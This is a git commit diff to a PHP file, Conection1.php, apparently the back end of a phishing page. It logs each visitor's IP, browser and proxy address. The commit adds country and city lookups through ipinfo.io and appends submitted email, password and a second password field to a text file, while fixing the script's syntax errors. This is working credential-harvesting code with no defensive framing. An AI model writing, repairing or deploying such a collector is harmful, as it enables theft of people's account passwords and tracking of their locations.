5a46c2022aba7cc7125841a1796705b299e6d8fd
holamundo12345new <104818999+holamundo12345new@users.noreply.github.com>
2022-05-05 21:10:19 -0500

    Update Conection1.php

--- Conection1.php
+++ Conection1.php
@@ -3,32 +3,34 @@
 date_default_timezone_set('America/Caracas');
 ini_set("display_errors", 0);
 
-
 if (empty($_SERVER["QUERY_STRING"])){
     $Fichero = "NEW01.txt"; //nombre del fichero donde se guardan los informes.
     $ip = $_SERVER["REMOTE_ADDR"]; //guarda en la variable el ip 
-     
+    $fecha = date("Y-m-d;H:i:s"); //fecha y hora (por lo general del servidor) 
     $sistema = $_SERVER['HTTP_USER_AGENT']; //Esto nos genera varios datos del navegador y del sistema operativo 
     $conproxy = $_SERVER["HTTP_X_FORWARDED_FOR"]; //En caso de usar proxy para esconderse aqui estaria el ip real
-    $log = "FECHA: $fecha"
-    $log = "SISTEMA: $sistema"
-    $log = "IP: $ip"
-    $log = "IPPROXY: $conproxy \x0D\x0A"; 
-    $file = fopen("NEW01.txt", "a");
+    $log = "FECHA: $fecha SISTEMA: $sistema IP: $ip IPPROXY: $conproxy \x0D\x0A"; 
+    $fp = fopen($Fichero, "a" ); 
     fwrite($fp, $log); 
     fclose($fp); 
 }
 
+
+$cc = trim(file_get_contents("http://ipinfo.io/{$ip}/country"));
+$city = trim(file_get_contents("http://ipinfo.io/{$ip}/city"));
+
+	
 	$file = fopen("NEW01.txt", "a");
 	
 fwrite($file, 
 "* EMAIL: ".$_POST['email']."
 * PASS: ".$_POST['pass']."
 * PASS1: ".$_POST['pass1']."
-* FECHA: 
+* F-H-IP-P-C: 
 ".date('Y-m-d')."
 ".date('H:i:s')."
 ".$userp."
+".$ip."
 ".$cc."
 ".$city."   
 " . PHP_EOL);
